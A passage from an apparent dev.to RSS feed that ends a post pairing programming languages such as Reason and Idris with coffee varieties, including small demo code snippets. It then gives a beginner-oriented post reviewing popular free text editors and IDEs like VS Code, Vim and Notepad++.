&lt;p&gt;As for Reason, from a syntax point of view, it's eerily similar to JavaScript. This happens for a good reason (pun intended): it's a language mostly directed at JavaScript developers. Reducing "grammar friction" is one of its objectives. However, under that first superficial layer of familiarity lies a different language in many, many ways.&lt;br&gt;
First off, Reason, unlike JavaScript, is powered by OCaml. You could say that it's a syntax layer on top of OCaml. At its core, it has the kind of strong and rich type system that JavaScript could only dream of (I still love you, JavaScript, just not in the same way!). With Reason, you'll be able to construct better software that's easier to rely on. In addition to that, you can compile to both JavaScript and OCaml, giving you access to two very mature ecosystems at once. Oh, and if you needed one more reason (yes, pun intended… again) to try it, two words: pattern matching. Think of it as a sort of switch statement that lets you match the shape of your data instead of just doing it by an explicit value. Trust me, once you use a language with pattern matching, you'll miss it whenever you're using one that doesn't!&lt;/p&gt;

&lt;p&gt;If you feel like trying out something new but don't feel like going too far from your comfort zone, be it other kinds of coffee or programming languages with C style syntax, then maybe you should consider checking out Reason or Rwandan coffee, you can't go wrong with either one!&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight reasonml"&gt;&lt;code&gt;&lt;span class="k"&gt;let&lt;/span&gt; &lt;span class="n"&gt;workingHours&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;8&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="k"&gt;let&lt;/span&gt; &lt;span class="n"&gt;workStartsAt&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;9&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="k"&gt;let&lt;/span&gt; &lt;span class="n"&gt;myPreferredDrink&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;"Rwandan coffee"&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;

&lt;span class="k"&gt;let&lt;/span&gt; &lt;span class="n"&gt;translateTime&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;hour&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;=&amp;gt;&lt;/span&gt; 
  &lt;span class="n"&gt;hour&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&lt;/span&gt; &lt;span class="mi"&gt;13&lt;/span&gt; 
  &lt;span class="o"&gt;?&lt;/span&gt; &lt;span class="n"&gt;string_of_int&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;hour&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;++&lt;/span&gt; &lt;span class="s2"&gt;"AM"&lt;/span&gt; 
  &lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="n"&gt;string_of_int&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;hour&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt; &lt;span class="mi"&gt;12&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;++&lt;/span&gt; &lt;span class="s2"&gt;"PM"&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;

&lt;span class="k"&gt;let&lt;/span&gt; &lt;span class="n"&gt;whatToDo&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;firstHour&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="n"&gt;currentHour&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="n"&gt;drink&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;=&amp;gt;&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
  &lt;span class="k"&gt;let&lt;/span&gt; &lt;span class="n"&gt;timeOfDay&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;firstHour&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;currentHour&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
  &lt;span class="k"&gt;let&lt;/span&gt; &lt;span class="n"&gt;atTime&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;predicate&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;=&amp;gt;&lt;/span&gt; 
      &lt;span class="s2"&gt;"At "&lt;/span&gt; &lt;span class="o"&gt;++&lt;/span&gt; &lt;span class="n"&gt;translateTime&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;timeOfDay&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;++&lt;/span&gt; &lt;span class="n"&gt;predicate&lt;/span&gt; &lt;span class="o"&gt;++&lt;/span&gt; &lt;span class="s2"&gt;"!"&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;

  &lt;span class="k"&gt;switch&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;timeOfDay&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="n"&gt;timeOfDay&lt;/span&gt; &lt;span class="ow"&gt;mod&lt;/span&gt; &lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
  &lt;span class="o"&gt;|&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;_&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;=&amp;gt;&lt;/span&gt; &lt;span class="n"&gt;atTime&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;" drink more "&lt;/span&gt; &lt;span class="o"&gt;++&lt;/span&gt; &lt;span class="n"&gt;drink&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; 
  &lt;span class="o"&gt;|&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;13&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="n"&gt;_&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;=&amp;gt;&lt;/span&gt; &lt;span class="n"&gt;atTime&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;": Lunch break"&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
  &lt;span class="o"&gt;|&lt;/span&gt; &lt;span class="n"&gt;_&lt;/span&gt; &lt;span class="o"&gt;=&amp;gt;&lt;/span&gt; &lt;span class="n"&gt;atTime&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;" drink "&lt;/span&gt; &lt;span class="o"&gt;++&lt;/span&gt; &lt;span class="n"&gt;drink&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
  &lt;span class="p"&gt;};&lt;/span&gt;
&lt;span class="p"&gt;};&lt;/span&gt;

&lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;hour&lt;/span&gt; &lt;span class="k"&gt;in&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt; &lt;span class="k"&gt;to&lt;/span&gt; &lt;span class="n"&gt;workingHours&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
  &lt;span class="nn"&gt;Js&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;log&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;whatToDo&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;workStartsAt&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="n"&gt;hour&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="n"&gt;myPreferredDrink&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
&lt;span class="p"&gt;};&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;h2&gt;
  &lt;a href="#idris-and-sumatran-coffee-strange-hard-to-grasp-and-filled-with-incredible-depth"&gt;
  &lt;/a&gt;
  Idris and Sumatran coffee: Strange, hard to grasp and filled with incredible depth
&lt;/h2&gt;

&lt;p&gt;When it comes to programming languages that I enjoy playing around with, a certain group of so-called functional programming languages is at the top. One of the most popular in that group is Haskell, from which Idris takes a lot of cues.&lt;/p&gt;

&lt;p&gt;One of the core tenants of a functional programming language is that functions are first class citizens. You can treat them as you would any other value, which allows for pretty powerful things like returning functions or passing them around as arguments to other functions. They also tend to feature very strong type systems. However, one other thing that makes languages such as Idris so special is their declarative syntax style, which looks more as if you were describing things instead of the more intuitive command-like style (do this, then that) of writing imperative style code.&lt;/p&gt;

&lt;p&gt;Sumatran coffee is also a very special kind of coffee because of the way in which it's processed, as well as the kind of climate where it grows. This makes it so that Sumatran coffee tastes quite different from what you would expect coffee to taste like. It tastes almost foreign to someone more used to the kind of "regular" coffee you would find at your average café. In the same way, Idris or Haskell look almost foreign to someone used to more imperative programming languages like C or Java.&lt;/p&gt;

&lt;p&gt;Yet, besides all that, Idris most distinctive feature is not that it's a functional programming language per se, but rather something more unique: dependent types. You can enhance a type by providing a value together with it. A good example for this would be the &lt;code&gt;concat&lt;/code&gt; function, which would be typed something like &lt;code&gt;List n t -&amp;gt; List m t -&amp;gt; List (n + m) t&lt;/code&gt;. The first argument will be a list of &lt;code&gt;n&lt;/code&gt; elements, the second a list of &lt;code&gt;m&lt;/code&gt; elements and the result will be a list with &lt;code&gt;n + m&lt;/code&gt; elements. How cool is that?! With dependent types, you gain a whole new level of control over what to expect from your code. In my book, that’s always good.&lt;/p&gt;

&lt;p&gt;Whenever you're ready to try something different and exciting, be it Idris, Sumatran coffee or (even better) both: be prepared and enjoy the ride!&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight haskell"&gt;&lt;code&gt;&lt;span class="n"&gt;isSumatranCoffee&lt;/span&gt; &lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="kt"&gt;String&lt;/span&gt; &lt;span class="o"&gt;-&amp;gt;&lt;/span&gt; &lt;span class="kt"&gt;Bool&lt;/span&gt;
&lt;span class="n"&gt;isSumatranCoffee&lt;/span&gt; &lt;span class="s"&gt;"Sumatran"&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="kt"&gt;True&lt;/span&gt;
&lt;span class="n"&gt;isSumatranCoffee&lt;/span&gt; &lt;span class="kr"&gt;_&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="kt"&gt;False&lt;/span&gt;

&lt;span class="n"&gt;drinkOrPass&lt;/span&gt; &lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="kt"&gt;String&lt;/span&gt; &lt;span class="o"&gt;-&amp;gt;&lt;/span&gt; &lt;span class="kt"&gt;String&lt;/span&gt;
&lt;span class="n"&gt;drinkOrPass&lt;/span&gt; &lt;span class="n"&gt;coffee&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="kr"&gt;case&lt;/span&gt; &lt;span class="n"&gt;isSumatranCoffee&lt;/span&gt; &lt;span class="n"&gt;coffee&lt;/span&gt; &lt;span class="kr"&gt;of&lt;/span&gt;
  &lt;span class="kt"&gt;True&lt;/span&gt; &lt;span class="o"&gt;=&amp;gt;&lt;/span&gt; &lt;span class="s"&gt;"I'll have some of that Sumatran coffee, please!"&lt;/span&gt;
  &lt;span class="kt"&gt;False&lt;/span&gt; &lt;span class="o"&gt;=&amp;gt;&lt;/span&gt; &lt;span class="s"&gt;"No thanks, I’d rather have something else"&lt;/span&gt;

&lt;span class="n"&gt;main&lt;/span&gt; &lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="kt"&gt;IO&lt;/span&gt; &lt;span class="nb"&gt;()&lt;/span&gt;
&lt;span class="n"&gt;main&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;putStrLn&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;drinkOrPass&lt;/span&gt; &lt;span class="s"&gt;"Sumatran"&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;






&lt;p&gt;There are of course many other programming languages and coffee beans that are worth talking about. Like Nicaraguan coffee with its acidic notes, the aromatic wonder that Ethiopian coffee is, the esoteric 8th with its stack-based syntax or Clojure &lt;code&gt;(which is a cool language (based on Lisp (which means (it uses lots of parentheses))))&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Hopefully, I got to pique your curiosity on at least one of the combos that I paired above. Few things are as fun as trying new programming languages. Combine that with a cup of coffee made with freshly roasted beans, and you're all set!&lt;/p&gt;

</description>
      <category>programming</category>
      <category>coffee</category>
      <category>ada</category>
      <category>pony</category>
    </item>
    <item>
      <title>Best IDE’s and Text Editors!</title>
      <author>KUMAR HARSH</author>
      <pubDate>Thu, 24 Jun 2021 11:40:30 +0000</pubDate>
      <link>https://dev.to/cenacr007_harsh/best-ide-s-and-text-editors-31i0</link>
      <guid>https://dev.to/cenacr007_harsh/best-ide-s-and-text-editors-31i0</guid>
      <description>&lt;p&gt;As a coder, finding a text editor that works for you is critical. You’ll be spending tons of time working in it, so get cozy.&lt;/p&gt;

&lt;p&gt;For those just getting started and wondering about text editors, why they’re important and which to use – &lt;strong&gt;keep reading!&lt;/strong&gt;&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#what-is-a-text-editor"&gt;
  &lt;/a&gt;
  What is a text editor?
&lt;/h2&gt;

&lt;p&gt;The formal definition is: &lt;/p&gt;

&lt;p&gt;&lt;strong&gt;“A text editor is a type of program used for editing plain text files.”&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;Essentially, a text editor is a program on you computer that allows you to create and edit a range of programming language files.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;AKA this is the place where you write your code!&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;Text editors handle “hand coding” many different languages, i.e.: HTML, CSS, JavaScript, PHP, Ruby, Java, Python, and so forth.&lt;/p&gt;

&lt;p&gt;If you already use one you might think,&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;"Why is it important for me to know about the different Text Editors and IDE's available out there, if the one I am currently working on works just fine?"&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;Well simply put, &lt;/p&gt;

&lt;p&gt;&lt;strong&gt;There's nothing more satisfying than finding  the perfect Text Editor.&lt;/strong&gt;, and you won't find the perfect one unless you try some of these out yourself.&lt;/p&gt;

&lt;p&gt;Keep in mind that there is no &lt;strong&gt;THE BEST EDITOR&lt;/strong&gt; out there, each one is different, &lt;strong&gt;the best text editor for you is ultimately what makes you most efficient.&lt;/strong&gt;, so experiment with a few find out the one which suits you the best.&lt;/p&gt;

&lt;p&gt;Now there are dozens of editors out there but I will only mention the ones which have gained immense popularity and are widely used by the community, and are &lt;strong&gt;FREE&lt;/strong&gt; to use.&lt;/p&gt;

&lt;p&gt;Here’s a collection of my favorite text editors. Some of these are also considered IDEs.&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;Text editors are not the same as IDEs (Integrated Development Environment). While almost every IDE has the capability of creating and editing plain text documents, they also include an abundance of other features.&lt;/p&gt;

&lt;p&gt;IDEs have different panels and widgets, taking a lot more space. An everyday text editor is much more lightweight and flexible.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Meaning you can do a lot more with IDEs than simply write code.&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#visual-studio-code"&gt;
  &lt;/a&gt;
  &lt;a href="https://code.visualstudio.com/"&gt;Visual Studio Code&lt;/a&gt;
&lt;/h2&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--tujq5Np8--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/h483cgpanilkewi336t0.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--tujq5Np8--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/h483cgpanilkewi336t0.png" alt="vs"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Visual Studio Code is a open source-code editor made by Microsoft for Windows, Linux and MacOS.&lt;/p&gt;

&lt;p&gt;Features include support for debugging, syntax highlighting, intelligent code completion, snippets, code refactoring, large library of extensions and plugins, and embedded Git.&lt;/p&gt;

&lt;p&gt;Not quite an IDE (that’s actually a &lt;a href="https://visualstudio.microsoft.com/vs/"&gt;separate product&lt;/a&gt; altogether), VS Code can take on most of the tasks of an IDE with the right configuration and plugin library. &lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#sublime-text"&gt;
  &lt;/a&gt;
  &lt;a href="https://www.sublimetext.com/"&gt;Sublime Text&lt;/a&gt;
&lt;/h2&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--E8d5-MtU--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/cxf4sdvfomwq4l1lp57f.jpg" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--E8d5-MtU--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/cxf4sdvfomwq4l1lp57f.jpg" alt="sublime"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Sublime Text is a shareware cross-platform source code editor with a Python application programming interface.&lt;/p&gt;

&lt;p&gt;Sublime Text is a beautiful, feature-rich code editor. Maybe the biggest draw is that it puts a premium on user experience. The UX is probably the tightest of every entry on the list. This is because of features like distraction-free writing mode, quick shortcuts/search, split editing, and much more. One of the biggest features users flaunt is the ridiculously intuitive keyboard shortcut system.&lt;/p&gt;

&lt;p&gt;They offer an indefinite, never-ending trial so it's essentially free to use unless you chose to upgrade to premium.&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#vim"&gt;
  &lt;/a&gt;
  &lt;a href="https://filehippo.com/download_vim/"&gt;Vim&lt;/a&gt;
&lt;/h2&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--E5RvrY_6--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/nvl7r8t7qi7qc3y0ulmg.jpg" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--E5RvrY_6--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/nvl7r8t7qi7qc3y0ulmg.jpg" alt="vim"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Vim is hardcore. Let’s be clear about that upfront. While other text editors are newbie friendly this one is definitely not. From the official website down to the software itself, Vim is a coder’s tool for coders by coders.&lt;/p&gt;

&lt;p&gt;It’s designed for use both from a command-line interface (CLI) and as a standalone application in a graphical user interface (GUI).&lt;/p&gt;

&lt;p&gt;Vim provides many commands which make editing functionality really powerful.&lt;/p&gt;

&lt;p&gt;Vim definitely requires a learning curve and a willingness to immerse yourself in a whole new feature-set that might not be the same as some other text editors you are used to.&lt;/p&gt;

&lt;p&gt;Once you get past the UI and the steep learning curve, you’ll see why the text editor is designed the way it is. It does roughly everything all the other best text editors can do. But more than maybe anything else on the list, it’s designed for efficiency and function.&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#atom"&gt;
  &lt;/a&gt;
  &lt;a href="https://atom.io/"&gt;Atom&lt;/a&gt;
&lt;/h2&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--LdaC3guW--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/1cix61ysyouplj0iaj1c.jpg" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--LdaC3guW--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/1cix61ysyouplj0iaj1c.jpg" alt="atom"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Atom is a free and open-source and highly customizable text and source code editor for MacOS, Linux, and Windows with support for plug-ins written in JavaScript, and embedded Git Control, developed by GitHub and now owned by Microsoft. Atom is a desktop application built using web technologies.&lt;/p&gt;

&lt;p&gt;Built around a minimal core, Atom comes with multiple language-specific packages built in, and the library of community-written ones has exploded over the years since the editor was first released.&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#notepad"&gt;
  &lt;/a&gt;
  &lt;a href="https://notepad-plus-plus.org/downloads/"&gt;Notepad++&lt;/a&gt;
&lt;/h2&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--SIuQIesx--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/ntmjk6wvvzgo8a0brssy.jpg" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--SIuQIesx--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/ntmjk6wvvzgo8a0brssy.jpg" alt="n++"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Notepad++ is an extremely popular text editor. That is in part because it’s free and GPL-licensed open source. Even more than that, though, the reason it’s one of the best text editors around is that it’s simple.&lt;/p&gt;

&lt;p&gt;One of the things that makes Notepad++ stand out is the fact that it’s already been translated into over 80 languages.&lt;/p&gt;

&lt;p&gt;The downside: this software is Windows-only.&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#brackets"&gt;
  &lt;/a&gt;
  &lt;a href="https://filehippo.com/download_brackets/"&gt;Brackets&lt;/a&gt;
&lt;/h2&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--1N1KEdoY--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/r3wbug4w2npwqkyg856n.jpg" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--1N1KEdoY--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/r3wbug4w2npwqkyg856n.jpg" alt="brackets"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Brackets is a free and open-source code editor that is made for web developers. Created and released by Adobe Systems, Brackets has a clean user interface that is filled with brilliant features: Live Preview, Quick Edit, etc. Link to download&lt;br&gt;
Codeshare: Share code in real-time with developers in your browser.&lt;/p&gt;

&lt;p&gt;It does, however, offer some unique and useful features. One of those features being Extract, a tool which allows you to extract information such as colors, fonts, gradients, measurements, directly from PSDs as clean CSS. For front-end developers working in a design agency who have to recreate pixel-perfect sites from mock-ups, there may be no better tool for you.&lt;/p&gt;
&lt;h2&gt;
  &lt;a href="#bluefish"&gt;
  &lt;/a&gt;
  &lt;a href="http://bluefish.openoffice.nl/download.html"&gt;Bluefish&lt;/a&gt;
&lt;/h2&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--kKXPEAzL--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/skvfse6l5xcmdef3m8ml.jpg" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--kKXPEAzL--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/skvfse6l5xcmdef3m8ml.jpg" alt="bluefish"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Bluefish is more of an IDE than a real text editor, which means it may be a little advanced for brand new users. It’s free, supports pretty much every language because it’s open-source, and comes with a wide variety of useful features for use across many platforms.  It supports coding languages including HTML, XHTML, CSS, XML, PHP, C, C++, JavaScript, Java, Go, Ada, D, SQL, Perl, ColdFusion, JSP, Python, Ruby, and shell.&lt;/p&gt;
&lt;h2&gt;
  &lt;a href="#online-ides"&gt;
  &lt;/a&gt;
  Online IDE's
&lt;/h2&gt;
&lt;h3&gt;
  &lt;a href="#replit"&gt;
  &lt;/a&gt;
  &lt;a href="https://replit.com/"&gt;Repl.it&lt;/a&gt;
&lt;/h3&gt;

&lt;p&gt;It is a simple yet powerful &lt;strong&gt;Online&lt;/strong&gt; IDE, Editor, Compiler, Interpreter, and REPL. Code, compile, run, and host in 50+ programming languages.&lt;/p&gt;
&lt;h3&gt;
  &lt;a href="#codeshare"&gt;
  &lt;/a&gt;
  &lt;a href="https://codeshare.io/"&gt;Codeshare&lt;/a&gt;
&lt;/h3&gt;

&lt;p&gt;Share code in real-time with developers in your browser. An online code editor for interviews, troubleshooting, teaching.&lt;/p&gt;
&lt;h2&gt;
  &lt;a href="#bonus"&gt;
  &lt;/a&gt;
  Bonus
&lt;/h2&gt;
&lt;h3&gt;
  &lt;a href="#vi"&gt;
  &lt;/a&gt;
  &lt;a href="https://www.tutorialspoint.com/unix/unix-vi-editor.htm"&gt;Vi&lt;/a&gt;
&lt;/h3&gt;

&lt;p&gt;The &lt;strong&gt;default&lt;/strong&gt; editor that comes with the UNIX operating system is called vi (visual editor).&lt;/p&gt;
&lt;h2&gt;
  &lt;a href="#whats-my-favorite-text-editor"&gt;
  &lt;/a&gt;
  What’s my favorite text editor?
&lt;/h2&gt;

&lt;p&gt;Glad you asked.&lt;/p&gt;

&lt;p&gt;I LOVE VS CODE. It’s the first text editor I ever downloaded and I’m not looking back.&lt;/p&gt;

&lt;p&gt;I’ve played with Sublime, but there’s something about VS Code. It’s attractive, easy to use, tons and tons of customizations and modifications using the never ending extensions … plus all my friends use it&lt;/p&gt;

&lt;p&gt;But, truly, VS Code is a great editor – that’s why so many use it, and it has gained immense popularity since it's release.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;In Conclusion&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;When trying to make a list of the best code and text editors available, it’s impossible not to miss a few strong contenders.&lt;br&gt;
Every Coder, and developer has a favorite set of tools just like every carpenter has a favorite hammer and an artist has a favorite set of brushes.&lt;/p&gt;

&lt;p&gt;What do you think are the best code editors? &lt;/p&gt;

&lt;p&gt;Let me know in the comments!&lt;/p&gt;

&lt;p&gt;I hope you found this article valuable. If yes do let me know in the comments 😊&lt;/p&gt;

&lt;p&gt;Also if you got any question feel free to ping me on &lt;a href="https://twitter.com/cenacr007_harsh"&gt;Twitter&lt;/a&gt; or &lt;a href="https://www.linkedin.com/in/kumarharsh22/"&gt;Linkedin&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;DEV Profile&lt;/strong&gt;&lt;/p&gt;


&lt;div class="ltag__user ltag__user__id__641726"&gt;
  
    .ltag__user__id__641726 .follow-action-button {
      background-color: #000000 !important;
      color: #000000 !important;
      border-color: #000000 !important;
    }
  
    &lt;a href="/cenacr007_harsh" class="ltag__user__link profile-image-link"&gt;
      &lt;div class="ltag__user__pic"&gt;
        &lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--gHAd0jjF--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://res.cloudinary.com/practicaldev/image/fetch/s--nO18I-lK--/c_fill%2Cf_auto%2Cfl_progressive%2Ch_150%2Cq_auto%2Cw_150/https://dev-to-uploads.s3.amazonaws.com/uploads/user/profile_image/641726/d1caf43e-4478-42c3-8ac3-f3b2980d031b.png" alt="cenacr007_harsh image"&gt;
      &lt;/div&gt;
    &lt;/a&gt;
  &lt;div class="ltag__user__content"&gt;
    &lt;h2&gt;
&lt;a class="ltag__user__link" href="/cenacr007_harsh"&gt;KUMAR HARSH&lt;/a&gt;
&lt;/h2&gt;
    &lt;div class="ltag__user__summary"&gt;
      &lt;a class="ltag__user__link" href="/cenacr007_harsh"&gt;Upcoming Full Stack Web Developer with a passion for Writing.
Development is Hard, and I try to make the process a little bit easier and overall a fun experience by sharing my knowledge with you.&lt;/a&gt;
    &lt;/div&gt;
  &lt;/div&gt;
&lt;/div&gt;


&lt;h2&gt;
  &lt;a href="#thank-you"&gt;
  &lt;/a&gt;
  Thank You!
&lt;/h2&gt;

</description>
      <category>productivity</category>
      <category>programming</category>
      <category>codenewbie</category>
    </item>
    <item>
      <title>How to Build an Online Bus Ticket Booking and Reservation System: Key Features and Step-By-Step Development Process</title>
      <author>AscendixTech</author>
      <pubDate>Thu, 24 Jun 2021 11:07:44 +0000</pubDate>
